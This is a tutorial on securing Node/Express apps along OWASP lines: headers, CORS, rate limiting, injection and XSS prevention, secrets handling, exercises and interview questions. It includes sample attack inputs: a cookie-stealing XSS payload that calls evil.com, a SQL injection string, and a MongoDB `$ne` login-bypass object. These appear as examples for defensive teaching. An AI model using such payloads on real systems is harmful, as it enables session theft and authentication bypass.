# Security Best Practices (OWASP) — Complete Guide

## Table of Contents
1. [Securing HTTP Headers with Helmet](#1-securing-http-headers-with-helmet)
2. [CORS Configuration](#2-cors-configuration)
3. [Rate Limiting](#3-rate-limiting)
4. [SQL / NoSQL Injection Prevention](#4-sql--nosql-injection-prevention)
5. [XSS Prevention](#5-xss-prevention)
6. [Environment Secrets Management](#6-environment-secrets-management)
7. [OWASP Top 10 Mapping](#7-owasp-top-10-mapping)
8. [Hands-On Exercises](#8-hands-on-exercises)
9. [Interview Q&A](#9-interview-qa)

---

## 1. Securing HTTP Headers with Helmet

By default, Express doesn't set many security-relevant HTTP response headers. `helmet` is a collection of small middleware functions that set them for you.

```bash
npm install helmet
```

```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// applies a sensible set of security headers with one line
app.use(helmet());
```

| Header Helmet sets | Protects against |
|---------------------|-------------------|
| `Strict-Transport-Security` | Forces HTTPS, preventing protocol downgrade attacks |
| `X-Content-Type-Options: nosniff` | Stops browsers from MIME-sniffing responses into executable types |
| `X-Frame-Options: DENY` | Prevents your site being embedded in a hidden iframe (clickjacking) |
| `Content-Security-Policy` | Restricts which sources scripts/styles/images can load from (mitigates XSS) |
| `X-DNS-Prefetch-Control` | Limits DNS prefetching that can leak browsing intent |

Helmet's defaults are a good starting point; tighten `contentSecurityPolicy` further for apps serving untrusted user content.

---

## 2. CORS Configuration

CORS (Cross-Origin Resource Sharing) controls which browser-side origins are allowed to call your API. Getting this wrong either blocks legitimate frontends or, worse, opens your API to any website.

```bash
npm install cors
```

```javascript
const cors = require('cors');

// ❌ Dangerous — allows literally any website to call your API with credentials
app.use(cors({ origin: '*', credentials: true }));

// ✅ Restrict to known frontend origins
const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];

app.use(
  cors({
    origin: (origin, callback) => {
      // allow requests with no origin (curl, mobile apps, server-to-server)
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error('Not allowed by CORS'));
      }
    },
    credentials: true,              // allow cookies to be sent cross-origin
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
  })
);
```

**Key rule:** `origin: '*'` combined with `credentials: true` is actively rejected by browsers (and is a security anti-pattern even where it isn't) — never combine a wildcard origin with credentialed requests. Explicitly allowlist origins instead.

---

## 3. Rate Limiting

Without rate limiting, login endpoints are vulnerable to brute-force password guessing, and any endpoint can be hit hard enough to degrade service (DoS).

```bash
npm install express-rate-limit
```

```javascript
const rateLimit = require('express-rate-limit');

// general limiter for the whole API
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                 // 100 requests per IP per window
  standardHeaders: true,    // return rate limit info in RateLimit-* headers
  legacyHeaders: false,
  message: { error: 'too many requests, please try again later' },
});
app.use(apiLimiter);

// stricter limiter specifically for login (brute-force protection)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                   // only 5 login attempts per IP per 15 minutes
  message: { error: 'too many login attempts, please try again later' },
});
app.post('/login', loginLimiter, loginHandler);
```

Different endpoints deserve different limits — a login route needs to be much stricter than a public read-only `GET /products` route, since login is the target of credential-stuffing and brute-force attacks.

---

## 4. SQL / NoSQL Injection Prevention

Injection happens when user input is concatenated directly into a query string, letting an attacker change the query's meaning.

```javascript
// ❌ SQL Injection — vulnerable
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
// input: ' OR '1'='1
// becomes: SELECT * FROM users WHERE email = '' OR '1'='1'  → returns ALL users

// ✅ Parameterized query — the driver escapes values automatically
const [rows] = await db.query('SELECT * FROM users WHERE email = ?', [req.body.email]);
```

```javascript
// ❌ NoSQL Injection (MongoDB) — vulnerable
// input: { "email": { "$ne": null }, "password": { "$ne": null } }
const user = await User.findOne({ email: req.body.email, password: req.body.password });
// $ne (not-equal) operators can bypass the intended equality check entirely

// ✅ Fix 1: validate/sanitize input types before querying
if (typeof req.body.email !== 'string' || typeof req.body.password !== 'string') {
  return res.status(400).json({ error: 'invalid input' });
}

// ✅ Fix 2: strip Mongo operators from user input
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize()); // removes keys starting with '$' or containing '.'
```

| Defense | Applies to |
|---------|-----------|
| Parameterized queries / prepared statements | SQL (MySQL, PostgreSQL) |
| ORM/query builder (Sequelize, Prisma, Knex) used correctly | SQL — avoid raw string interpolation even through the ORM |
| Input type validation (reject objects where a string is expected) | NoSQL (MongoDB operator injection) |
| `express-mongo-sanitize` | MongoDB — strips `$`/`.` keys from `req.body`, `req.query`, `req.params` |
| Never build queries via string concatenation | Both |

---

## 5. XSS Prevention

Cross-Site Scripting lets an attacker inject JavaScript that runs in another user's browser under your app's origin — typically by storing malicious `<script>` content that later gets rendered unescaped.

```javascript
// ❌ Vulnerable — rendering user input as raw HTML
res.send(`<h1>Welcome ${req.query.name}</h1>`);
// input: <script>fetch('https://evil.com?cookie='+document.cookie)</script>
// → script executes in the victim's browser

// ✅ Escape output — most template engines (EJS <%= %>, Pug) auto-escape by default
// EJS: <%= name %>  → auto-escapes special characters
// Avoid <%- name %> (unescaped) unless you deliberately trust the content

// ✅ For APIs returning JSON, res.json() never executes as script
res.json({ message: `Welcome ${req.query.name}` }); // safe — it's data, not markup
```

Additional layers of defense:

```javascript
// Content-Security-Policy via Helmet restricts which script sources can execute,
// so even if an injection slips through, inline/untrusted scripts are blocked
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"], // blocks inline <script> and third-party script sources
    },
  })
);

// Sanitize any HTML you must accept from users (e.g., rich text editors)
const sanitizeHtml = require('sanitize-html');
const clean = sanitizeHtml(userSubmittedHtml, {
  allowedTags: ['b', 'i', 'em', 'strong', 'p'],
  allowedAttributes: {},
});
```

| Defense | Why it works |
|---------|--------------|
| Auto-escaping template engines | Converts `<`, `>`, `&`, `"` into HTML entities so injected markup renders as text, not code |
| `httpOnly` cookies | Even if an XSS payload executes, it can't read session/auth cookies |
| Content-Security-Policy | Blocks execution of inline/untrusted scripts even if injection succeeds |
| `sanitize-html` / allowlist-based HTML sanitizing | Strips dangerous tags/attributes from user-submitted rich content |

---

## 6. Environment Secrets Management

Secrets (DB passwords, JWT signing keys, API keys) must never be hardcoded or committed to source control.

```bash
npm install dotenv
```

```
# .env  (add this file to .gitignore — NEVER commit it)
JWT_ACCESS_SECRET=a-long-random-string-generated-with-crypto
DATABASE_URL=postgres://user:pass@localhost:5432/mydb
STRIPE_SECRET_KEY=sk_live_...
```

```javascript
// server.js — load env vars before anything else uses them
require('dotenv').config();

const jwtSecret = process.env.JWT_ACCESS_SECRET;
if (!jwtSecret) {
  throw new Error('JWT_ACCESS_SECRET is not set — refusing to start');
}
```

```
# .gitignore
.env
.env.local
.env.*.local
```

Checklist:

```
✅ .env is in .gitignore (verify with: git check-ignore .env)
✅ .env.example (with placeholder values, no real secrets) is committed
   instead, so teammates know which vars to set
✅ Secrets are generated with sufficient randomness:
     node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
✅ Different secrets per environment (dev/staging/prod) — a leaked
   dev secret should never grant access to production
✅ In production, secrets come from a secrets manager (AWS Secrets
   Manager, Vault, platform env vars) rather than a .env file on disk
✅ Fail fast at startup if a required secret is missing, rather than
   silently running with an insecure default
```

---

## 7. OWASP Top 10 Mapping

| OWASP Top 10 (2021) | Node/Express-specific mitigation |
|----------------------|-----------------------------------|
| **A01: Broken Access Control** | RBAC middleware + explicit resource-ownership checks on every ID-based route (see Phase-07-04) |
| **A02: Cryptographic Failures** | bcrypt for passwords (never MD5/SHA1), HTTPS everywhere, secrets never hardcoded (`.env` + secrets manager) |
| **A03: Injection** | Parameterized queries/ORMs for SQL, `express-mongo-sanitize` + input validation for MongoDB, never string-concatenate queries |
| **A04: Insecure Design** | Rate limiting on sensitive endpoints, generic auth error messages (no user enumeration), threat-model auth flows up front |
| **A05: Security Misconfiguration** | `helmet()` for secure headers, disable `X-Powered-By` (`app.disable('x-powered-by')`), don't leak stack traces in production error responses |
| **A06: Vulnerable and Outdated Components** | `npm audit` / `npm audit fix` in CI, dependabot or `npm outdated` reviews, pin versions in `package-lock.json` |
| **A07: Identification and Authentication Failures** | Strong password hashing (bcrypt), short-lived JWTs + revocable refresh tokens, rate-limited login, MFA where applicable |
| **A08: Software and Data Integrity Failures** | Verify JWT signatures (never `jwt.decode()` without `jwt.verify()`), lockfile integrity, avoid `eval`/dynamic `require` of untrusted input |
| **A09: Security Logging and Monitoring Failures** | Log authentication failures/rate-limit hits (without logging secrets/passwords), centralized log aggregation, alerting on anomalous login patterns |
| **A10: Server-Side Request Forgery (SSRF)** | Validate/allowlist any user-supplied URLs the server fetches (webhooks, image proxies), block requests to internal IP ranges |

---

## 8. Hands-On Exercises

**Exercise 1:** Add `helmet()` to an existing Express app and inspect the response headers with `curl -I http://localhost:3000` before and after — list which headers appeared.

**Exercise 2:** Configure `cors()` to allow only `http://localhost:5173` (a typical Vite dev server origin) with `credentials: true`, then verify a request from a different origin (simulate with a different `Origin` header via curl) is rejected.

**Exercise 3:** Add `express-rate-limit` to a `/login` route with `max: 5` per 15 minutes. Write a small script that calls `/login` with a wrong password 6 times in a row and confirm the 6th attempt returns a 429.

**Exercise 4:** Take a raw SQL query built with string interpolation and rewrite it using parameterized placeholders. Demonstrate the injection with a payload like `' OR '1'='1` against the vulnerable version first.

**Exercise 5:** Add `express-mongo-sanitize` to an app using MongoDB, then send a login request with `{ "email": { "$ne": null }, "password": { "$ne": null } }` before and after — confirm the sanitizer neutralizes the payload.

**Exercise 6:** Create a `.env` file with a `JWT_ACCESS_SECRET`, load it with `dotenv`, add `.env` to `.gitignore`, and commit a `.env.example` with placeholder values instead. Verify `git status` shows `.env` as ignored.

---

## 9. Interview Q&A

**Q: What does helmet.js actually do, and is it enough on its own?**
Answer: Helmet sets a collection of HTTP response headers (`Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, etc.) that instruct browsers to enforce safer behaviors — like refusing to render your site in an iframe, or blocking script execution from untrusted sources. It's a good baseline but not sufficient alone — it doesn't replace input validation, parameterized queries, rate limiting, or proper authentication.

**Q: Why is `origin: '*'` combined with `credentials: true` dangerous in a CORS config?**
Answer: `credentials: true` allows cookies/auth headers to be sent cross-origin. Combined with a wildcard origin, any website on the internet could make authenticated requests to your API using a victim's browser session, and browsers actually block this exact combination for that reason. The fix is an explicit allowlist of trusted origins.

**Q: How do you prevent SQL injection in Node applications?**
Answer: Never build queries by concatenating user input into a string. Use parameterized queries/prepared statements (`db.query('... WHERE email = ?', [email])`) or an ORM/query builder used as intended — the driver handles escaping so user input is always treated as data, never as part of the query structure.

**Q: How is NoSQL injection different from SQL injection, and how do you prevent it in MongoDB apps?**
Answer: Instead of injecting SQL syntax through a string, an attacker sends a structured object (e.g., `{"$ne": null}`) where a string is expected, exploiting MongoDB's query operators to bypass logic like a password check. Prevention: validate that request fields are the expected primitive type (reject objects) before querying, and use `express-mongo-sanitize` to strip keys starting with `$` or containing `.` from incoming request data.

**Q: Why should rate limiting on a login endpoint be stricter than on the rest of the API?**
Answer: Login endpoints are the direct target of brute-force and credential-stuffing attacks, where an attacker tries many password guesses per account or many accounts with a leaked password list. A tight limit (e.g., 5 attempts per 15 minutes per IP) makes that impractical, while a general API limiter (e.g., 100 requests per 15 minutes) can stay generous enough not to hamper normal usage on read endpoints.

**Q: How should secrets like JWT signing keys and database credentials be managed in a Node app?**
Answer: They should never be hardcoded or committed to source control — load them from environment variables (via `dotenv` locally, and a proper secrets manager or the hosting platform's env var store in production), keep `.env` in `.gitignore` while committing a placeholder `.env.example`, use different secrets per environment, and fail fast at startup if a required secret is missing rather than silently falling back to an insecure default.
